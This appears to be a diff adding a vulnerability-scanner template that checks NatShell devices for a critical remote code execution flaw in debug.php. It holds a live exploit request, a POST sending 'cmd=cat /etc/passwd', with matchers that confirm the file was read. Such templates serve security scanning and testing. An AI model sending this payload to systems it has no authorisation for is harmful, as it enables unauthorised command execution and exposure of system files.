@@ -1,0 +1,32 @@
+http:
+    - body: |
+        cmd=cat /etc/passwd
+      matchers:
+        - part: body
+          regex:
+            - toor:[x*]:0:0
+          type: regex
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: POST
+      path:
+        - '{{BaseURL}}/debug.php'
+id: natshell-rce
+info:
+    author: pikpikcu
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: |
+        The NatShell debug file is susceptible to a remote code execution vulnerability.
+    metadata:
+        max-request: 1
+    name: NatShell Debug File - Remote Code Execution
+    reference:
+        - https://mp.weixin.qq.com/s/g4YNI6UBqIQcKL0TRkKWlw
+    severity: critical
+    tags:
+        - natshell
